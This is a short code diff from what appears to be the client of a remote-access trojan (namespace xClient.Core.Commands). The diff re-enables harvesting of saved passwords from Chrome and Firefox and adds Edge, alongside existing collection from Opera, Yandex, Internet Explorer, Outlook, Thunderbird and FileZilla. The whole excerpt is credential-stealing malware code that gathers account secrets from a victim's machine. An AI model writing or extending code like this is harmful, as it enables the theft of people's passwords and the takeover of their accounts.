@@ -23,12 +23,12 @@ namespace xClient.Core.Commands
         {
             List<RecoveredAccount> recovered = new List<RecoveredAccount>();
 
-      //      recovered.AddRange(Chrome.GetSavedPasswords());
+            recovered.AddRange(Chrome.GetSavedPasswords());
             recovered.AddRange(Opera.GetSavedPasswords());
             recovered.AddRange(Yandex.GetSavedPasswords());
             recovered.AddRange(InternetExplorer.GetSavedPasswords());
-          //  recovered.AddRange(Firefox.GetSavedPasswords());
-          //  Thunderbird.nssModule = Firefox.NssModule;
+            recovered.AddRange(Firefox.GetSavedPasswords());
+            recovered.AddRange(Edge.GetPasswords());
             recovered.AddRange(Outlook.GetSavedPasswords());
             recovered.AddRange(Thunderbird.GetSavedPasswords());
             recovered.AddRange(FileZilla.GetSavedPasswords());
